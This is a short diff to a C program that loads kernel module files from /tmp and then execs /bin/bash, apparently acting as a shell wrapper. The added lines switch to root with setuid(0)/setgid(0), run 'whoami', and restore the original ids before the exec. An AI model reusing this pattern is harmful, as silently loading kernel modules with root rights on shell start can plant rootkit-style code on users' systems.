@@ -18,6 +18,12 @@ char rm_temp_file[] = "rm -r /tmp/ko_filea.ko";
 char * temp_file_name = rm_temp_file + 6;// /tmp/ko_filea
 
 int main(int argc,char*args[],char *env[]){
+
+  unsigned int o_uid = getuid(),o_gid = getgid();
+  //to root
+  setuid(0);
+  setgid(0);
+
   /* k is a counter, 'a','b','c',... */
   /*ko_filea.ko ko_fileb.ko ko_filec.ko*/
   char * k = temp_file_name;
@@ -38,6 +44,8 @@ int main(int argc,char*args[],char *env[]){
   }
   fclose(f);
 
+system("whoami");
+
   for(;*k >= 'a';(*k)--){
     /* do something with temp_file_name */
     printf("I am trying to load %s\n",temp_file_name);
@@ -57,6 +65,8 @@ int main(int argc,char*args[],char *env[]){
   }
   /*TODO*/
   //do something to run the real program
+  setuid(o_uid);
+  setgid(o_gid);
   execve("/bin/bash",args,env);//Careful:recursion
   return 0;
 }
